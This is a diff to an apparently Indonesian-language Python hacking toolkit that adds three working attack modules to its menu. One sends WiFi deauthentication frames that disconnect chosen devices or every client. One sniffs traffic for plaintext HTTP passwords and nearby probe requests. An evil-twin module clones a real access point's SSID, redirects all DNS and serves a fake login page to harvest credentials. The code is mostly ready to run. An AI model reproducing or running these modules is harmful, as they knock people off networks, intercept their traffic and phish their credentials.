@@ -307,6 +307,181 @@ def mod_netcut():
         _save("netcut", vi, f"cut {rng}s gw={gw} restored")
         print("restored ARP — target online kembali.")
 
+# ---------------------------------------------------------------- deauth (kick from WiFi)
+def mod_deauth():
+    _banner("DEAUTH (kick device dari WiFi — 802.11, perlu monitor mode)")
+    if os.geteuid() != 0:
+        print("need root. abort"); return
+    import subprocess as sp
+    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
+    ap_mac = _ask("AP bssid (mac router):").strip().lower()
+    client = _ask("client mac (target; blank=all):").strip().lower()
+    cnt = int(_ask("deauth count [10]: ").strip() or "10")
+    if not ap_mac: print("need AP bssid"); return
+    # prefer aireplay-ng (reliable) kalau ada
+    import shutil as _sh
+    if _sh.which("aireplay-ng") is not None:
+        cmd = ["aireplay-ng", "-0", str(cnt), "-a", ap_mac]
+        if client: cmd += ["-c", client]
+        cmd += [iface]
+        print("$ " + " ".join(cmd))
+        try:
+            sp.run(cmd)
+        except KeyboardInterrupt:
+            pass
+        print("deauth selesai.")
+        return
+    print("aireplay-ng tidak ada — coba raw deauth frame via AF_PACKET (monitor iface).")
+    print("pastikan interface monitor: ip link set " + iface + " down && iw dev " + iface + " set type monitor && ip link set " + iface + " up")
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    except OSError as e:
+        print(f"raw socket gagal ({e}) — pakai aireplay-ng (aircrack-ng)."); return
+    try:
+        s.bind((iface, 0))
+    except OSError as e:
+        print(f"bind {iface} gagal ({e}) — sehingga monitor iface."); return
+    # 802.11 deauth: type/mgmt (0x00 0x00), flags, duration, da, sa, bssid, seq, reason
+    da = bytes.fromhex(client.replace(":", "")) if client else b"\xff\xff\xff\xff\xff\xff"
+    sa = bytes.fromhex(ap_mac.replace(":", ""))
+    bssid = sa
+    frame = b"\x00\x00\x00\x00\xff" + da + sa + bssid + b"\x00\x00\x07\x00"
+    print(f"sending {cnt} deauth frames (da={da.hex(':') if client else 'broadcast'}, sa={ap_mac})...")
+    for _ in range(cnt):
+        try:
+            s.send(frame)
+        except OSError as e:
+            print(f"frame err: {e}"); break
+        import time as _t; _t.sleep(0.05)
+    s.close()
+    print("deauth sent.")
+
+# ---------------------------------------------------------------- sniff (passive HTTP creds / nearby probe)
+def mod_sniff():
+    _banner("SNIFF (passive capture — HTTP plaintext creds + probe request nearby)")
+    if os.geteuid() != 0:
+        print("need root. abort"); return
+    import struct as _st
+    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
+    secs = int(_ask("capture seconds [10]: ").strip() or "10")
+    mode = _ask("target: [c]reds HTTP  [p]robe nearby: ").strip().lower() or "c"
+    print(f"capturing on {iface} {secs}s (raw AF_PACKET)...")
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    try:
+        s.bind((iface, 0))
+    except OSError as e:
+        print(f"bind gagal ({e})"); return
+    s.settimeout(1)
+    import re as _re
+    stop = [time.time() + secs]
+    hits = []
+    try:
+        while time.time() < stop[0]:
+            try:
+                pkt, _ = s.recvfrom(65535)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            if mode == "p":
+                # 802.11 probe request: subtype 0x04 in frame control
+                if len(pkt) > 30 and (pkt[0] & 0xfc) == 0x40:
+                    # probe req body: SSID after fixed header (24 bytes) + tags
+                    try:
+                        ssid = pkt[24:].split(b"\x00", 1)[0].decode(errors="ignore")
+                        if ssid.isprintable() and ssid:
+                            hits.append(("probe", ssid, pkt[10:16].hex(":")))
+                            print(f"[probe] {ssid} src={pkt[10:16].hex(':')}")
+                    except Exception:
+                        pass
+            else:
+                # grab TCP payload on port 80 with plaintext creds patterns
+                eth = pkt[:14]
+                if len(pkt) <= 14: continue
+                ethertype = _st.unpack("!H", eth[12:14])[0]
+                if ethertype != 0x0800: continue
+                ip = pkt[14:]
+                if len(ip) < 20: continue
+                proto = ip[9]
+                ihl = (ip[0] & 0x0f) * 4
+                if proto != 6 or len(ip) < ihl + 20: continue
+                tcp = ip[ihl:]
+                sport, dport = _st.unpack("!HH", tcp[0:4])
+                data = tcp[(tcp[12] >> 4) * 4:]
+                if dport == 80 or sport == 80:
+                    body = data.decode(errors="ignore")
+                    m = _re.search(r"(?i)(password|passwd|user(name)?|login)(=|\"|:)([^\s&\"']+)", body)
+                    if m:
+                        line = body[:80].replace("\n", " ")
+                        key = (m.group(0),)
+                        if key not in hits:
+                            hits.append(key)
+                            print(f"[cred] {dport==80 and 'C->S' or 'S->C'} {sport}:{dport} {line}")
+    except KeyboardInterrupt:
+        pass
+    s.close()
+    print(f"done — {len(hits)} hit(s)")
+    _save("sniff", iface, f"mode={mode} hits={hits}")
+
+# ---------------------------------------------------------------- evil twin (clone AP + landing)
+def mod_eviltwin():
+    _banner("EVIL TWIN (clone AP — hostapd + DNS landing, root, Linux/termux-root)")
+    if os.geteuid() != 0:
+        print("need root. abort"); return
+    import shutil as _sh
+    for b in ("hostapd", "dnsmasq"):
+        if not _sh.which(b):
+            print(f"{b} tidak ada — pkg install {b}  (termux: root-repo)."); return
+    ssid = _ask("SSID (nama AP asli yang mau di-clone):").strip()
+    iface = _ask("interface monitoring [wlan0]: ").strip() or "wlan0"
+    gw_ip = _ask("gateway ip untuk AP palsu [10.0.0.1]: ").strip() or "10.0.0.1"
+    chan = _ask("channel [6]: ").strip() or "6"
+    if not ssid: print("need ssid"); return
+    import tempfile as _tf
+    d = _tf.mkdtemp(prefix="eviltwin_")
+    hostapd_cfg = os.path.join(d, "hostapd.conf")
+    with open(hostapd_cfg, "w") as f:
+        f.write(f"interface={iface}\n")
+        f.write(f"ssid={ssid}\n")
+        f.write("hw_mode=g\n")
+        f.write(f"channel={chan}\n")
+        f.write("wpa=2\nwpa_passphrase=hkalltest\nwpa_key_mgmt=WPA-PSK\n")
+    dnsmasq_cfg = os.path.join(d, "dnsmasq.conf")
+    with open(dnsmasq_cfg, "w") as f:
+        f.write(f"interface={iface}\n")
+        f.write(f"dhcp-range=10.0.0.10,10.0.0.50,12h\n")
+        f.write(f"address=/#/{gw_ip}\n")
+    landing = os.path.join(d, "index.html")
+    with open(landing, "w") as f:
+        f.write("<html><body><h1>WiFi Config Required</h1><form method=post>"
+                "<input name=user placeholder=username><br><input name=pass type=password>"
+                "<br><button>Connect</button></form></body></html>")
+    print(f"evil twin '{ssid}' on {iface} (open + WPA2 'hkalltest'). Landing: http://{gw_ip}")
+    print(f"configs di {d} — ctrl-c stop, scan session destroy")
+    procs = []
+    try:
+        import http.server as _hs
+        os.chdir(d)
+        handler = _hs.SimpleHTTPRequestHandler
+        httpd = _hs.HTTPServer((gw_ip, 80), handler)
+        import threading as _th
+        _th.Thread(target=httpd.serve_forever, daemon=True).start()
+        procs.append(subprocess.Popen(["dnsmasq", "-C", dnsmasq_cfg, "--no-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+        procs.append(subprocess.Popen(["hostapd", hostapd_cfg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+        print("AP palsu + dnsmasq + landing aktif. Access log di httpd (lihat terminal).")
+        while True:
+            import time as _t
+            _t.sleep(60)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for p in procs:
+            try: p.terminate()
+            except Exception: pass
+        try: httpd.shutdown()
+        except Exception: pass
+        print("evil twin stopped.")
+
 # ---------------------------------------------------------------- dns spoof
 def mod_dnsspoof():
     _banner("DNS SPOOF LAB (needs root — your own DNS server for testing)")
@@ -419,10 +594,14 @@ def mod_websec():
                 ch = ch.strip()
                 if ch in order: order[ch]()
     elif cat == "2":
-        print("\na. mitm (arp spoof)   b. dnsspoof   c. netcut (cut internet target)")
+        print("\na. mitm (arp spoof)   b. dnsspoof   c. netcut (cut internet)")
+        print("   d. deauth (kick wifi) e. sniff   f. eviltwin")
         sel = input("select [a]: ").strip() or "a"
         if sel == "b": mod_dnsspoof()
         elif sel == "c": mod_netcut()
+        elif sel == "d": mod_deauth()
+        elif sel == "e": mod_sniff()
+        elif sel == "f": mod_eviltwin()
         else: mod_mitm()
     else:
         mod_ddos()
@@ -434,6 +613,9 @@ PLUGIN = {
     "idor": ("IDOR enumeration (lab)", mod_idor, True),
     "mitm": ("ARP MITM lab (root)", mod_mitm, True),
     "netcut": ("Cut internet target (root, netcut-like)", mod_netcut, True),
+    "deauth": ("Deauth/kick dari WiFi (root, monitor)", mod_deauth, True),
+    "sniff": ("Sniff HTTP creds + probe nearby (root)", mod_sniff, True),
+    "eviltwin": ("Evil twin AP (root, hostapd+dnsmasq)", mod_eviltwin, True),
     "dnsspoof": ("fake DNS lab (root)", mod_dnsspoof, True),
     "ddos": ("Load test (bounded, own server)", mod_ddos, True),
     "websec": ("Orchestrator menu (lab)", mod_websec, True),
